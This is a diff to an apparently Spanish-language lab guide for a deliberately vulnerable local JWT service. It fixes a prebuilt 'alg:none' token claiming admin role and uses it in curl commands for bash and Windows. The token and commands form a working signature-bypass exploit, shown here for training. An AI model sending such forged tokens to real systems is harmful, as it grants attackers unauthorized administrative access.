@@ -42,7 +42,7 @@ curl -s http://localhost:8201/api/jwt/vulnerable/verify \
 Token preconstruido (header `{"alg":"none"}`, payload `{"sub":"admin","role":"ADMIN"}`):
 
 ```bash
-NONE_TOKEN='eyJhbGciOiJubmUifQ.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.'
+NONE_TOKEN='eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.'
 
 curl -s http://localhost:8201/api/jwt/vulnerable/verify \
   -H "Authorization: Bearer $NONE_TOKEN" | jq .
@@ -76,5 +76,5 @@ Emite con el emisor vulnerable y prueba en seguro; fallará por issuer/audience.
 ## Windows — cmd
 
 ```cmd
-curl.exe -s http://localhost:8201/api/jwt/vulnerable/verify -H "Authorization: Bearer eyJhbGciOiJubmUifQ.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9."
+curl.exe -s http://localhost:8201/api/jwt/vulnerable/verify -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9."
 ```
